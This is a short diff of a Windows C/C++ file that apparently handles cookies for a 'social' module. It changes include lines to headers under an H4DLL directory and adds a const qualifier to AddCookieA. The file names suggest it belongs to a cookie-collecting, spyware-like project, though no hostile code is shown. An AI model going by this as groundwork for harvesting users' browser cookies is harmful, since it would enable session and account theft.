@@ -1,6 +1,16 @@
 #include <Windows.h>
-#include <stdio.h>
-#include "../common.h"
+#include <json/json.h>
+#include <time.h>
+#include "../../H4DLL/common.h"
+#include "../../H4DLL/AM_Core.h"
+#include "../../H4DLL/bin_string.h"
+#include "../../H4DLL/H4-DLL.h"
+#include "../../H4DLL/demo_functions.h"
+#include "../../H4DLL/bss.h"
+#include "../../H4DLL/HM_IpcModule.h"
+#include "../../H4DLL/process.h"
+#include "../../H4DLL/LOG.h"
+
 #include "CookieHandler.h"
 #include "SocialMain.h"
 #define _CRT_SECURE_NO_WARNINGS 1
@@ -120,7 +130,7 @@ BOOL AddCookieW(WCHAR *domain, WCHAR *name, WCHAR *value)
 	return ret_val;
 }
 
-BOOL AddCookieA(char *domain_tmp, char *name, char *value)
+BOOL AddCookieA(const char *domain_tmp, char *name, char *value)
 {
 	DWORD i;
 	char domain[2048];
